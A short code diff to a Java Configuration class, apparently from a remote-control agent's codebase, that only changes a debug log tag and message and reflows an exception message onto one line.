@@ -275,7 +275,7 @@ public class Configuration {
 				wrappedClearConf.get(params, 0, plen);
 			}
 
-			Log.d(TAG, "Event: " + type + " Action: " + action
+			Log.d("QZ", "Configuration.java Event: " + type + " Action: " + action
 					+ " Params Len: " + plen);
 
 			final EventConf e = new EventConf(type, i, action, params);
@@ -398,8 +398,7 @@ public class Configuration {
 		try {
 
 			if (rawConf == null) {
-				throw new RCSException(
-						"Cannot allocate memory for configuration");
+				throw new RCSException("Cannot allocate memory for configuration");
 			}
 
 			// Decrypt configuration
